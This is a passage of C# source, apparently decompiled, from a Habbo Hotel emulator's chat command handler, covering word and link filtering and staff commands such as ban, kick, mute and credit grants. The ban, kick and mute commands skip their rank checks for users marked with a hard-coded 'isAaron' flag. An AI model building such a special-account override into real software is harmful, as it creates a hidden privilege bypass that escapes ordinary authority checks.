using System;
using System.Collections.Generic;
using System.Data;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Phoenix.Core;
using Phoenix.HabboHotel.GameClients;
using Phoenix.HabboHotel.Achievements;
using Phoenix.HabboHotel.Users;
using Phoenix.Util;
using Phoenix.Messages;
using Phoenix.HabboHotel.Users.Authenticator;
using Phoenix.HabboHotel.Items;
using Phoenix.HabboHotel.Rooms;
using Phoenix.Storage;
using System.Net;
namespace Phoenix.HabboHotel.Misc
{
	internal sealed class ChatCommandHandler
	{
		private static List<string> BadWords;
		private static List<string> BadReplacement;
		private static List<bool> BadStrict;
		private static List<string> ExternalLinks;
		public static void initFilter(DatabaseClient dbClient)
		{
            Logging.Write("Loading Chat Filter..");
			ChatCommandHandler.BadWords = new List<string>();
			ChatCommandHandler.BadReplacement = new List<string>();
			ChatCommandHandler.BadStrict = new List<bool>();
			ChatCommandHandler.ExternalLinks = new List<string>();
			ChatCommandHandler.InitWords(dbClient);
            Logging.WriteLine("completed!");
		}
		public static void InitWords(DatabaseClient dbClient)
		{
			ChatCommandHandler.BadWords.Clear();
			ChatCommandHandler.BadReplacement.Clear();
			ChatCommandHandler.BadStrict.Clear();
			ChatCommandHandler.ExternalLinks.Clear();
			DataTable dataTable = dbClient.ReadDataTable("SELECT * FROM wordfilter ORDER BY word ASC;");
			if (dataTable != null)
			{
				foreach (DataRow dataRow in dataTable.Rows)
				{
					ChatCommandHandler.BadWords.Add(dataRow["word"].ToString());
					ChatCommandHandler.BadReplacement.Add(dataRow["replacement"].ToString());
					ChatCommandHandler.BadStrict.Add(PhoenixEnvironment.EnumToBool(dataRow["strict"].ToString()));
				}
			}
			DataTable dataTable2 = dbClient.ReadDataTable("SELECT * FROM linkfilter;");
			if (dataTable2 != null)
			{
				foreach (DataRow dataRow in dataTable2.Rows)
				{
					ChatCommandHandler.ExternalLinks.Add(dataRow["externalsite"].ToString());
				}
			}
		}
		public static bool CheckExternalLink(string Website)
		{
			if (GlobalClass.ExternalLinkMode == "disabled")
			{
				return false;
			}
			else
			{
				if ((Website.StartsWith("http://") || Website.StartsWith("www.") || Website.StartsWith("https://")) && ChatCommandHandler.ExternalLinks != null && ChatCommandHandler.ExternalLinks.Count > 0)
				{
					foreach (string current in ChatCommandHandler.ExternalLinks)
					{
						if (Website.Contains(current))
						{
							if (GlobalClass.ExternalLinkMode == "whitelist")
							{
								return true;
							}
							if (!(GlobalClass.ExternalLinkMode == "blacklist"))
							{
							}
						}
					}
				}
				return (Website.StartsWith("http://") || Website.StartsWith("www.") || (Website.StartsWith("https://") && GlobalClass.ExternalLinkMode == "blacklist") || (GlobalClass.ExternalLinkMode == "whitelist" && false));
			}
		}
        public static string ApplyAdfly(string Input)
        {
            return Input;
        }
        public static string ApplyWordFilter(string Input)
        {
            if ((BadWords != null) && (BadWords.Count > 0))
            {
                int num = -1;
                foreach (string str in BadWords)
                {
                    num++;
                    if (Input.ToLower().Contains(str.ToLower()) && BadStrict[num])
                    {
                        Input = Regex.Replace(Input, str, BadReplacement[num], RegexOptions.IgnoreCase);
                    }
                    else if (Input.ToLower().Contains(" " + str.ToLower() + " "))
                    {
                        Input = Regex.Replace(Input, str, BadReplacement[num], RegexOptions.IgnoreCase);
                    }
                }
            }
            return Input;
        }

		public static bool Parse(GameClient Session, string Input)
		{
			string[] Params = Input.Split(new char[]
			{
				' '
			});
			GameClient TargetClient = null;
			Room room = Session.GetHabbo().CurrentRoom;
			if (!PhoenixEnvironment.GetGame().GetRoleManager().CommandsList.ContainsKey(Params[0]))
			{
				return false;
			}
			else
			{
				try
				{
					int num;
					if (room != null && room.CheckRights(Session, true))
					{
						num = PhoenixEnvironment.GetGame().GetRoleManager().CommandsList[Params[0]];
						if (num <= 33)
						{
							if (num == 8)
							{
								room = Session.GetHabbo().CurrentRoom;
								if (room.bool_5)
								{
									room.bool_5 = false;
								}
								else
								{
									room.bool_5 = true;
								}
								PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
								return true;
							}
							if (num == 33)
							{
								room = Session.GetHabbo().CurrentRoom;
								if (room != null && room.CheckRights(Session, true))
								{
									List<RoomItem> list = room.method_24(Session);
									Session.GetHabbo().GetInventoryComponent().method_17(list);
									Session.GetHabbo().GetInventoryComponent().UpdateItems(true);
									PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input + " " + Session.GetHabbo().CurrentRoomId);
									return true;
								}
								return false;
							}
						}
						else
						{
							if (num == 46)
							{
								room = Session.GetHabbo().CurrentRoom;
								try
								{
									int num2 = int.Parse(Params[1]);
									if (Session.GetHabbo().Rank >= 6)
									{
										room.UsersMax = num2;
									}
									else
									{
										if (num2 > 100 || num2 < 5)
										{
											Session.SendNotif("ERROR: Use a number between 5 and 100");
										}
										else
										{
											room.UsersMax = num2;
										}
									}
								}
								catch
								{
									return false;
								}
								PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
								return true;
							}
							if (num == 53)
							{
								room = Session.GetHabbo().CurrentRoom;
								PhoenixEnvironment.GetGame().GetRoomManager().UnloadRoom(room);
								PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
								return true;
							}
						}
					}
					switch (PhoenixEnvironment.GetGame().GetRoleManager().CommandsList[Params[0]])
					{
					case 2:
					{
						if (!Session.GetHabbo().HasRole("cmd_alert"))
						{
							return false;
						}
						string TargetUser = Params[1];
						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(TargetUser);
						if (TargetClient == null)
						{
							Session.SendNotif("Could not find user: " + TargetUser);
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
                            return true;
						}
						TargetClient.SendNotif(ChatCommandHandler.MergeParams(Params, 2), 0);
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
                        return true;
					}
					case 3:
					{
						if (!Session.GetHabbo().HasRole("cmd_award"))
						{
							return false;
						}
						string text = Params[1];
						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
						if (TargetClient == null)
						{
							Session.SendNotif("Could not find user: " + text);
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						PhoenixEnvironment.GetGame().GetAchievementManager().UnlockNextAchievement(TargetClient, Convert.ToUInt32(ChatCommandHandler.MergeParams(Params, 2)));
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					}
					case 4:
					{
						if (!Session.GetHabbo().HasRole("cmd_ban"))
						{
							return false;
						}
						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
						if (TargetClient == null)
						{
							Session.SendNotif("User not found.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						if (TargetClient.GetHabbo().Rank >= Session.GetHabbo().Rank && !Session.GetHabbo().isAaron)
						{
							Session.SendNotif("You are not allowed to ban that user.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						int num3 = 0;
						try
						{
							num3 = int.Parse(Params[2]);
						}
						catch (FormatException)
						{
						}
						if (num3 <= 600)
						{
							Session.SendNotif("Ban time is in seconds and must be at least than 600 seconds (ten minutes). For more specific preset ban times, use the mod tool.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						PhoenixEnvironment.GetGame().GetBanManager().BanUser(TargetClient, Session.GetHabbo().Username, (double)num3, ChatCommandHandler.MergeParams(Params, 3), false);
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					}
					case 6:
					{
						if (!Session.GetHabbo().HasRole("cmd_coins"))
						{
							return false;
						}
						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
						if (TargetClient == null)
						{
							Session.SendNotif("User could not be found.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						int num4;
						if (int.TryParse(Params[2], out num4))
						{
							TargetClient.GetHabbo().Credits = TargetClient.GetHabbo().Credits + num4;
							TargetClient.GetHabbo().UpdateCreditsBalance(true);
							TargetClient.SendNotif(Session.GetHabbo().Username + " has awarded you " + num4.ToString() + " credits!");
							Session.SendNotif("Credit balance updated successfully.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						Session.SendNotif("Please send a valid amount of credits.");
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					}
					case 7:
					{
						if (!Session.GetHabbo().HasRole("cmd_coords"))
						{
							return false;
						}
						room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
						if (room == null)
						{
							return false;
						}
						RoomUser class3 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
						if (class3 == null)
						{
							return false;
						}
						Session.SendNotif(string.Concat(new object[]
						{
							"X: ",
							class3.X,
							" - Y: ",
							class3.Y,
							" - Z: ",
							class3.Z,
							" - Rot: ",
							class3.RotBody,
							", sqState: ",
							room.Byte_0[class3.X, class3.Y].ToString()
						}));
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					}
					case 11:
						if (Session.GetHabbo().HasRole("cmd_enable"))
						{
							int int_ = int.Parse(Params[1]);
							Session.GetHabbo().GetAvatarEffectsInventoryComponent().ApplyEffect(int_, true);
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 14:
						if (Session.GetHabbo().HasRole("cmd_freeze"))
						{
							RoomUser class4 = Session.GetHabbo().CurrentRoom.GetRoomUserByHabbo(Params[1]);
							if (class4 != null)
							{
								class4.bool_5 = !class4.bool_5;
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 15:
						if (Session.GetHabbo().HasRole("cmd_givebadge"))
						{
							TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
							if (TargetClient != null)
							{
								TargetClient.GetHabbo().GetBadgeComponent().GiveBadge(TargetClient, PhoenixEnvironment.FilterInjectionChars(Params[2]), true);
							}
							else
							{
								Session.SendNotif("User: " + Params[1] + " could not be found in the database.\rPlease try your request again.");
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 16:
						if (Session.GetHabbo().HasRole("cmd_globalcredits"))
						{
							try
							{
								int num5 = int.Parse(Params[1]);
								PhoenixEnvironment.GetGame().GetClientManager().method_18(num5);
								using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
								{
									class5.ExecuteQuery("UPDATE users SET credits = credits + " + num5);
								}
							}
							catch
							{
								Session.SendNotif("Input must be a number");
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 17:
						if (Session.GetHabbo().HasRole("cmd_globalpixels"))
						{
							try
							{
								int num5 = int.Parse(Params[1]);
								PhoenixEnvironment.GetGame().GetClientManager().method_19(num5, false);
								using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
								{
									class5.ExecuteQuery("UPDATE users SET activity_points = activity_points + " + num5);
								}
							}
							catch
							{
								Session.SendNotif("Input must be a number");
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 18:
						if (Session.GetHabbo().HasRole("cmd_globalpoints"))
						{
							try
							{
								int num5 = int.Parse(Params[1]);
								PhoenixEnvironment.GetGame().GetClientManager().method_20(num5, false);
								using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
								{
									class5.ExecuteQuery("UPDATE users SET vip_points = vip_points + " + num5);
								}
							}
							catch
							{
								Session.SendNotif("Input must be a number");
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 19:
						if (Session.GetHabbo().HasRole("cmd_hal"))
						{
							string text2 = Params[1];
							Input = Input.Substring(4).Replace(text2, "");
							string text3 = Input.Substring(1);
							ServerMessage Message = new ServerMessage(161u);
							Message.AppendStringWithBreak(string.Concat(new string[]
							{
								TextManager.GetText("cmd_hal_title"),
								"\r\n",
								text3,
								"\r\n-",
								Session.GetHabbo().Username
							}));
							Message.AppendStringWithBreak(text2);
							PhoenixEnvironment.GetGame().GetClientManager().QueueBroadcaseMessage(Message);
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 20:
						if (Session.GetHabbo().HasRole("cmd_ha"))
						{
							string str = Input.Substring(3);
							ServerMessage Message2 = new ServerMessage(808u);
							Message2.AppendStringWithBreak(TextManager.GetText("cmd_ha_title"));
							Message2.AppendStringWithBreak(str + "\r\n- " + Session.GetHabbo().Username);
							ServerMessage Message3 = new ServerMessage(161u);
							Message3.AppendStringWithBreak(str + "\r\n- " + Session.GetHabbo().Username);
							PhoenixEnvironment.GetGame().GetClientManager().BroadcastMessage(Message2, Message3);
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;;
					case 21:
						if (Session.GetHabbo().HasRole("cmd_invisible"))
						{
                            Session.GetHabbo().Visible = !Session.GetHabbo().Visible;
                            Session.SendNotif("You are now " + (Session.GetHabbo().Visible ? "visible" : "invisible") + "\nTo apply the changes reload the room ;D"
                                
                                
                                );
							return true;
						}
						return false;
					case 22:
						if (!Session.GetHabbo().HasRole("cmd_ipban"))
						{
							return false;
						}
						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
						if (TargetClient == null)
						{
							Session.SendNotif("User not found.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						if (TargetClient.GetHabbo().Rank >= Session.GetHabbo().Rank && !Session.GetHabbo().isAaron)
						{
							Session.SendNotif("You are not allowed to ban that user.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						PhoenixEnvironment.GetGame().GetBanManager().BanUser(TargetClient, Session.GetHabbo().Username, 360000000.0, ChatCommandHandler.MergeParams(Params, 2), true);
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					case 23:
					{
						if (!Session.GetHabbo().HasRole("cmd_kick"))
						{
							return false;
						}
						string text = Params[1];
						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
						if (TargetClient == null)
						{
							Session.SendNotif("Could not find user: " + text);
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						if (Session.GetHabbo().Rank <= TargetClient.GetHabbo().Rank && !Session.GetHabbo().isAaron)
						{
							Session.SendNotif("You are not allowed to kick that user.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						if (TargetClient.GetHabbo().CurrentRoomId < 1u)
						{
							Session.SendNotif("That user is not in a room and can not be kicked.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(TargetClient.GetHabbo().CurrentRoomId);
						if (room == null)
						{
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						room.RemoveUserFromRoom(TargetClient, true, false);
						if (Params.Length > 2)
						{
							TargetClient.SendNotif("A moderator has kicked you from the room for the following reason: " + ChatCommandHandler.MergeParams(Params, 2));
						}
						else
						{
							TargetClient.SendNotif("A moderator has kicked you from the room.");
						}
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					}
					case 24:
						if (Session.GetHabbo().HasRole("cmd_massbadge"))
						{
							PhoenixEnvironment.GetGame().GetClientManager().method_21(Params[1]);
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 25:
						if (Session.GetHabbo().HasRole("cmd_masscredits"))
						{
							try
							{
								int num5 = int.Parse(Params[1]);
								PhoenixEnvironment.GetGame().GetClientManager().method_18(num5);
							}
							catch
							{
								Session.SendNotif("Input must be a number");
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 26:
						if (Session.GetHabbo().HasRole("cmd_masspixels"))
						{
							try
							{
								int num5 = int.Parse(Params[1]);
								PhoenixEnvironment.GetGame().GetClientManager().method_19(num5, true);
							}
							catch
							{
								Session.SendNotif("Input must be a number");
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 27:
						if (Session.GetHabbo().HasRole("cmd_masspoints"))
						{
							try
							{
								int num5 = int.Parse(Params[1]);
								PhoenixEnvironment.GetGame().GetClientManager().method_20(num5, true);
							}
							catch
							{
								Session.SendNotif("Input must be a number");
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 30:
					{
						if (!Session.GetHabbo().HasRole("cmd_motd"))
						{
							return false;
						}
						string text = Params[1];
						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
						if (TargetClient == null)
						{
							Session.SendNotif("Could not find user: " + text);
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						TargetClient.SendNotif(ChatCommandHandler.MergeParams(Params, 2), 2);
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					}
					case 31:
					{
						if (!Session.GetHabbo().HasRole("cmd_mute"))
						{
							return false;
						}
						string text = Params[1];
						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
						if (TargetClient == null || TargetClient.GetHabbo() == null)
						{
							Session.SendNotif("Could not find user: " + text);
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						if (TargetClient.GetHabbo().Rank >= Session.GetHabbo().Rank && !Session.GetHabbo().isAaron)
						{
							Session.SendNotif("You are not allowed to (un)mute that user.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						TargetClient.GetHabbo().Mute();
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					}
					case 32:
					{
						if (!Session.GetHabbo().HasRole("cmd_override"))
						{
							return false;
						}
						room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
						if (room == null)
						{
							return false;
						}
						RoomUser class3 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
						if (class3 == null)
						{
							return false;
						}
						if (class3.AllowOverride)
						{
							class3.AllowOverride = false;
							Session.SendNotif("Walking override disabled.");
						}
						else
						{
							class3.AllowOverride = true;
							Session.SendNotif("Walking override enabled.");
						}
						room.GenerateMaps();
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					}
					case 34:
					{
						if (!Session.GetHabbo().HasRole("cmd_pixels"))
						{
							return false;
						}
						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
						if (TargetClient == null)
						{
							Session.SendNotif("User could not be found.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						int num4;
						if (int.TryParse(Params[2], out num4))
						{
							TargetClient.GetHabbo().ActivityPoints = TargetClient.GetHabbo().ActivityPoints + num4;
							TargetClient.GetHabbo().UpdateActivityPointsBalance(true);
							TargetClient.SendNotif(Session.GetHabbo().Username + " has awarded you " + num4.ToString() + " Pixels!");
							Session.SendNotif("Pixels balance updated successfully.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						Session.SendNotif("Please send a valid amount of pixels.");
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					}
					case 35:
					{
						if (!Session.GetHabbo().HasRole("cmd_points"))
						{
							return false;
						}
						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
						if (TargetClient == null)
						{
							Session.SendNotif("User could not be found.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						int num4;
						if (int.TryParse(Params[2], out num4))
						{
							TargetClient.GetHabbo().shells = TargetClient.GetHabbo().shells + num4;
							TargetClient.GetHabbo().UpdateShellsBalance(false, true);
							TargetClient.SendNotif(Session.GetHabbo().Username + " has awarded you " + num4.ToString() + " Points!");
							Session.SendNotif("Points balance updated successfully.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						Session.SendNotif("Please send a valid amount of points.");
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					}
					case 39:
						if (Session.GetHabbo().HasRole("cmd_removebadge"))
						{
							TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
							if (TargetClient != null)
							{
								TargetClient.GetHabbo().GetBadgeComponent().RemoveBadge(PhoenixEnvironment.FilterInjectionChars(Params[2]));
							}
							else
							{
								Session.SendNotif("User: " + Params[1] + " could not be found in the database.\rPlease try your request again.");
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 41:
					{
						if (!Session.GetHabbo().HasRole("cmd_roomalert"))
						{
							return false;
						}
						room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
						if (room == null)
						{
							return false;
						}
						string string_ = ChatCommandHandler.MergeParams(Params, 1);
						for (int i = 0; i < room.UserList.Length; i++)
						{
							RoomUser class6 = room.UserList[i];
							if (class6 != null)
							{
								class6.GetClient().SendNotif(string_);
							}
						}
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					}
					case 42:
						if (!Session.GetHabbo().HasRole("cmd_roombadge"))
						{
							return false;
						}
						if (Session.GetHabbo().CurrentRoom == null)
						{
							return false;
						}
						for (int i = 0; i < Session.GetHabbo().CurrentRoom.UserList.Length; i++)
						{
							try
							{
								RoomUser class6 = Session.GetHabbo().CurrentRoom.UserList[i];
								if (class6 != null)
								{
									if (!class6.IsBot)
									{
										if (class6.GetClient() != null)
										{
											if (class6.GetClient().GetHabbo() != null)
											{
												class6.GetClient().GetHabbo().GetBadgeComponent().GiveBadge(class6.GetClient(), Params[1], true);
											}
										}
									}
								}
							}
							catch (Exception ex)
							{
								Session.SendNotif("Error: " + ex.ToString());
							}
						}
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					case 43:
					{
						if (!Session.GetHabbo().HasRole("cmd_roomkick"))
						{
							return false;
						}
						room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
						if (room == null)
						{
							return false;
						}
						bool flag = true;
						string text4 = ChatCommandHandler.MergeParams(Params, 1);
						if (text4.Length > 0)
						{
							flag = false;
						}
						for (int i = 0; i < room.UserList.Length; i++)
						{
							RoomUser class7 = room.UserList[i];
							if (class7 != null && class7.GetClient().GetHabbo().Rank < Session.GetHabbo().Rank)
							{
								if (!flag)
								{
									class7.GetClient().SendNotif("You have been kicked by an moderator: " + text4);
								}
								room.RemoveUserFromRoom(class7.GetClient(), true, flag);
							}
						}
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					}
					case 44:
						if (Session.GetHabbo().HasRole("cmd_roommute"))
						{
							if (Session.GetHabbo().CurrentRoom.RoomMuted)
							{
								Session.GetHabbo().CurrentRoom.RoomMuted = false;
							}
							else
							{
								Session.GetHabbo().CurrentRoom.RoomMuted = true;
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 45:
						if (Session.GetHabbo().HasRole("cmd_sa"))
						{
							ServerMessage Logging = new ServerMessage(134u);
							Logging.AppendUInt(0u);
							Logging.AppendString(Session.GetHabbo().Username + ": " + Input.Substring(3));
							PhoenixEnvironment.GetGame().GetClientManager().BroadcastMessageToStaff(Logging, Logging);
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 47:
						if (Session.GetHabbo().HasRole("cmd_setspeed"))
						{
							int.Parse(Params[1]);
							Session.GetHabbo().CurrentRoom.method_102(int.Parse(Params[1]));
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 48:
						if (Session.GetHabbo().HasRole("cmd_shutdown"))
						{
                            Logging.LogCriticalException("User " + Session.GetHabbo().Username + " shut down the server " + DateTime.Now.ToString());
							Task task = new Task(new Action(PhoenixEnvironment.BeginShutDown));
							task.Start();
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 49:
						if (Session.GetHabbo().HasRole("cmd_spull"))
						{
							try
							{
								string a = "down";
								string text = Params[1];
								TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
								room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
								if (Session == null || TargetClient == null)
								{
									return false;
								}
								RoomUser class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
								RoomUser class4 = room.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
								if (TargetClient.GetHabbo().Username == Session.GetHabbo().Username)
								{
									Session.GetHabbo().Sendselfwhisper("You cannot pull yourself");
									return true;
								}
								class6.Chat(Session, "*pulls " + TargetClient.GetHabbo().Username + " to them*", false);
								if (class6.RotBody == 0)
								{
									a = "up";
								}
								if (class6.RotBody == 2)
								{
									a = "right";
								}
								if (class6.RotBody == 4)
								{
									a = "down";
								}
								if (class6.RotBody == 6)
								{
									a = "left";
								}
								if (a == "up")
								{
									class4.MoveTo(class6.X, class6.Y - 1);
								}
								if (a == "right")
								{
									class4.MoveTo(class6.X + 1, class6.Y);
								}
								if (a == "down")
								{
									class4.MoveTo(class6.X, class6.Y + 1);
								}
								if (a == "left")
								{
									class4.MoveTo(class6.X - 1, class6.Y);
								}
								return true;
							}
							catch
							{
								return false;
							}
						}
						return false;
					case 50:
						if (Session.GetHabbo().HasRole("cmd_summon"))
						{
							TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
							if (TargetClient != null && TargetClient.GetHabbo().CurrentRoom != Session.GetHabbo().CurrentRoom)
							{
								ServerMessage Message5 = new ServerMessage(286u);
								Message5.AppendBoolean(Session.GetHabbo().CurrentRoom.IsPublic);
								Message5.AppendUInt(Session.GetHabbo().CurrentRoomId);
								TargetClient.SendMessage(Message5);
								TargetClient.SendNotif(Session.GetHabbo().Username + " has summoned you to them");
							}
							else
							{
								Session.GetHabbo().Sendselfwhisper("User: " + Params[1] + " could not be found - Maybe they're not online anymore :(");
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 51:
						if (!Session.GetHabbo().HasRole("cmd_superban"))
						{
							return false;
						}
						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
						if (TargetClient == null)
						{
							Session.SendNotif("User not found.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						if (TargetClient.GetHabbo().Rank >= Session.GetHabbo().Rank && !Session.GetHabbo().isAaron)
						{
							Session.SendNotif("You are not allowed to ban that user.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						PhoenixEnvironment.GetGame().GetBanManager().BanUser(TargetClient, Session.GetHabbo().Username, 360000000.0, ChatCommandHandler.MergeParams(Params, 2), false);
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					case 52:
					{
						if (!Session.GetHabbo().HasRole("cmd_teleport"))
						{
							return false;
						}
						room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
						if (room == null)
						{
							return false;
						}
						RoomUser class3 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
						if (class3 == null)
						{
							return false;
						}
						if (class3.TeleportMode)
						{
							class3.TeleportMode = false;
							Session.SendNotif("Teleporting disabled.");
						}
						else
						{
							class3.TeleportMode = true;
							Session.SendNotif("Teleporting enabled.");
						}
						room.GenerateMaps();
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					}
					case 54:
					{
						if (!Session.GetHabbo().HasRole("cmd_unmute"))
						{
							return false;
						}
						string text = Params[1];
